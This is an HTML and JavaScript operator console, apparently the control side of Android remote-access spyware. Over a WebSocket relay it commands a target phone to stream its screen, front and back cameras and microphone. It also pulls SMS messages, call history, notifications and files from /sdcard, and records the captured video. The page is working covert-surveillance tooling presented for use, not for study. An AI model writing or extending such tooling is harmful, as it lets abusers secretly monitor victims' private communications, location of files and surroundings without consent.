<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SystemSync - Master Control Console</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: #0f0f0f; color: #e0e0e0; margin: 0; padding: 20px; 
            display: flex; flex-direction: column; align-items: center;
        }

        /* Status & Header */
        .header { display: flex; align-items: center; gap: 20px; margin-bottom: 20px; }
        .status-badge { 
            background: #1e1e1e; padding: 8px 15px; border-radius: 20px; 
            display: flex; align-items: center; font-size: 14px; border: 1px solid #333;
        }
        .status-dot { height: 10px; width: 10px; border-radius: 50%; margin-right: 8px; background: #555; }
        .online { background: #00ff00; box-shadow: 0 0 10px #00ff00; }

        /* Main Viewport (Camera/Screen) */
        #main-viewport {
            width: 340px; height: 600px; background: #000;
            border: 10px solid #222; border-radius: 30px; 
            overflow: hidden; margin-bottom: 20px; position: relative;
            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
        }
        #display { width: 100%; height: 100%; object-fit: contain; }

        /* Control Panel */
        .controls { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 20px; width: 100%; max-width: 800px; }
        button { 
            padding: 12px; border: none; border-radius: 8px; cursor: pointer; 
            font-weight: 600; font-size: 12px; transition: 0.3s; color: white;
        }
        .btn-stream { background: #2ecc71; }
        .btn-cam { background: #9b59b6; }
        .btn-mic { background: #e67e22; }
        .btn-data { background: #34495e; border: 1px solid #555; }
        .btn-stop { background: #e74c3c; grid-column: span 3; }
        button:hover { filter: brightness(1.2); }

        /* Dedicated Windows Grid */
        .window-grid {
            display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 20px; width: 100%; max-width: 1200px;
        }

        .window {
            background: #1a1a1a; border: 1px solid #333; border-radius: 12px;
            height: 350px; display: flex; flex-direction: column; overflow: hidden;
            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
        }

        .window-header {
            background: #252525; padding: 10px 15px; font-size: 13px; font-weight: bold;
            border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center;
        }

        .window-content { 
            padding: 10px; overflow-y: auto; flex-grow: 1; font-family: 'Consolas', monospace; font-size: 12px; 
        }

        /* Specific Content Styles */
        .log-entry { border-bottom: 1px solid #222; padding: 8px 0; }
        .sms-from { color: #3498db; font-weight: bold; }
        .call-type { color: #f1c40f; }
        .file-item { padding: 5px; cursor: pointer; border-bottom: 1px solid #222; display: flex; justify-content: space-between; }
        .file-item:hover { background: #222; }

        /* Recording Indicator */
        .recording-active { animation: blink 1s infinite; background: #c0392b !important; }
        @keyframes blink { 50% { opacity: 0.6; } }
    </style>
</head>
<body>

    <div class="header">
        <h2>SystemSync v2.0</h2>
        <div class="status-badge">
            <div id="status-dot" class="status-dot"></div>
            <span id="status-text">Disconnected</span>
        </div>
    </div>

    <div id="main-viewport">
        <img id="display" src="" alt="Live View Standby">
    </div>

    <div class="controls">
        <button class="btn-stream" onclick="sendCommand('START_SCREEN')">SCREEN MIRROR</button>
        <button class="btn-cam" onclick="sendCommand('START_CAM:FRONT')">FRONT CAMERA</button>
        <button class="btn-cam" onclick="sendCommand('START_CAM:BACK')">BACK CAMERA</button>
        
        <button id="recordBtn" class="btn-data" onclick="toggleRecording()">START RECORD</button>
        <button id="micBtn" class="btn-mic" onclick="toggleMic()">LISTEN MIC</button>
        <button class="btn-data" onclick="clearLogs()">CLEAR ALL WINDOWS</button>
        
        <button class="btn-stop" onclick="sendCommand('STOP_ALL')">TERMINATE ALL SERVICES</button>
    </div>

    <div class="window-grid">
        <div class="window">
            <div class="window-header">
                <span>üí¨ SMS INBOX</span>
                <button class="btn-data" style="padding: 2px 8px;" onclick="sendCommand('GET_SMS')">REFRESH</button>
            </div>
            <div id="sms-window" class="window-content">Waiting for data...</div>
        </div>

        <div class="window">
            <div class="window-header">
                <span>üìû CALL HISTORY</span>
                <button class="btn-data" style="padding: 2px 8px;" onclick="sendCommand('GET_CALLS')">REFRESH</button>
            </div>
            <div id="call-window" class="window-content">Waiting for data...</div>
        </div>

        <div class="window">
            <div class="window-header">
                <span>üìÅ FILE EXPLORER</span>
                <button class="btn-data" style="padding: 2px 8px;" onclick="sendCommand('GET_FILES:/sdcard/')">ROOT</button>
            </div>
            <div id="file-window" class="window-content">Select 'Root' to browse...</div>
        </div>

        <div class="window">
            <div class="window-header">
                <span>üîî NOTIFICATIONS & SYSTEM</span>
            </div>
            <div id="system-window" class="window-content">Monitoring notifications...</div>
        </div>
    </div>

    <canvas id="recCanvas" style="display:none;"></canvas>

    <script>
        const display = document.getElementById('display');
        const statusDot = document.getElementById('status-dot');
        const statusText = document.getElementById('status-text');
        
        // Windows
        const smsWin = document.getElementById('sms-window');
        const callWin = document.getElementById('call-window');
        const fileWin = document.getElementById('file-window');
        const sysWin = document.getElementById('system-window');

        let ws;
        let isMicOn = false;
        let isRecording = false;
        let mediaRecorder;
        let recordedChunks = [];
        const canvas = document.getElementById('recCanvas');
        const ctx = canvas.getContext('2d');

        function connect() {
            ws = new WebSocket('wss://mirror-view.onrender.com');
            ws.onopen = () => {
                statusDot.classList.add('online');
                statusText.innerText = "Device Online";
                ws.send("I_AM_WEB");
                logSystem("Connected to device gateway.");
            };

            ws.onmessage = (e) => {
                const msg = e.data;
                
                if (msg.startsWith("FRAME:")) {
                    display.src = "data:image/jpeg;base64," + msg.substring(6);
                    if (isRecording) drawToCanvas();
                } 
                else if (msg.startsWith("SMS_DATA:")) handleSMS(msg.substring(9));
                else if (msg.startsWith("CALL_DATA:")) handleCalls(msg.substring(10));
                else if (msg.startsWith("FILE_DATA:")) handleFiles(msg.substring(10));
                else if (msg.startsWith("NOTIF:")) handleNotif(msg.substring(6));
                else if (msg.startsWith("AUDIO:")) playAudio(msg.substring(6));
                else if (msg === "STATUS:ONLINE") statusDot.classList.add('online');
            };

            ws.onclose = () => {
                statusDot.classList.remove('online');
                statusText.innerText = "Reconnecting...";
                setTimeout(connect, 3000);
            };
        }

        function sendCommand(cmd) {
            if (ws && ws.readyState === 1) {
                ws.send(cmd);
                logSystem("Command sent: " + cmd);
            }
        }

        // --- Data Handlers for Dedicated Windows ---

        function handleSMS(jsonStr) {
            try {
                const data = JSON.parse(jsonStr);
                smsWin.innerHTML = data.map(m => `
                    <div class="log-entry">
                        <span class="sms-from">${m.from}</span><br>${m.body}
                    </div>
                `).join('');
            } catch (e) { smsWin.innerText = jsonStr; }
        }

        function handleCalls(jsonStr) {
            try {
                const data = JSON.parse(jsonStr);
                callWin.innerHTML = data.map(c => `
                    <div class="log-entry">
                        <span class="call-type">[${c.type}]</span> ${c.number}
                    </div>
                `).join('');
            } catch (e) { callWin.innerText = jsonStr; }
        }

        function handleFiles(jsonStr) {
            try {
                const data = JSON.parse(jsonStr);
                fileWin.innerHTML = data.map(f => `
                    <div class="file-item" onclick="sendCommand('GET_FILES:/sdcard/${f.name}/')">
                        <span>${f.isDir ? 'üìÅ' : 'üìÑ'} ${f.name}</span>
                        <small>${f.isDir ? 'DIR' : 'FILE'}</small>
                    </div>
                `).join('');
            } catch (e) { fileWin.innerText = jsonStr; }
        }

        function handleNotif(data) {
            const [pkg, title, text] = data.split('|');
            const entry = `<div class="log-entry" style="color:#2ecc71"><b>${title}</b> (${pkg}): ${text}</div>`;
            sysWin.insertAdjacentHTML('afterbegin', entry);
        }

        function logSystem(msg) {
            sysWin.insertAdjacentHTML('afterbegin', `<div class="log-entry">${msg}</div>`);
        }

        // --- Mic & Recording Logic ---

        function toggleMic() {
            isMicOn = !isMicOn;
            if (isMicOn) {
                sendCommand("START_AUDIO");
                document.getElementById('micBtn').innerText = "STOP MIC";
                document.getElementById('micBtn').style.background = "#c0392b";
            } else {
                sendCommand("STOP_STREAM"); // Using general stop
                document.getElementById('micBtn').innerText = "LISTEN MIC";
                document.getElementById('micBtn').style.background = "#e67e22";
            }
        }

        let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        function playAudio(base64) {
            const binary = atob(base64);
            const bytes = new Int16Array(binary.length / 2);
            for (let i = 0; i < bytes.length; i++) {
                bytes[i] = (binary.charCodeAt(i*2+1) << 8) | binary.charCodeAt(i*2);
            }
            const buffer = audioCtx.createBuffer(1, bytes.length, 44100);
            buffer.getChannelData(0).set(Array.from(bytes).map(v => v / 32768));
            const source = audioCtx.createBufferSource();
            source.buffer = buffer; source.connect(audioCtx.destination); source.start();
        }

        function toggleRecording() {
            if (!isRecording) {
                canvas.width = display.naturalWidth || 360;
                canvas.height = display.naturalHeight || 640;
                const stream = canvas.captureStream(25);
                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                recordedChunks = [];
                mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    const a = document.createElement('a');
                    a.href = URL.createObjectURL(blob);
                    a.download = `monitor_${Date.now()}.webm`;
                    a.click();
                };
                mediaRecorder.start();
                isRecording = true;
                document.getElementById('recordBtn').classList.add('recording-active');
                document.getElementById('recordBtn').innerText = "STOP RECORD";
            } else {
                mediaRecorder.stop();
                isRecording = false;
                document.getElementById('recordBtn').classList.remove('recording-active');
                document.getElementById('recordBtn').innerText = "START RECORD";
            }
        }

        function drawToCanvas() { if (isRecording) ctx.drawImage(display, 0, 0, canvas.width, canvas.height); }
        function clearLogs() { smsWin.innerHTML = ""; callWin.innerHTML = ""; fileWin.innerHTML = ""; }

        connect();
    </script>
</body>
</html>
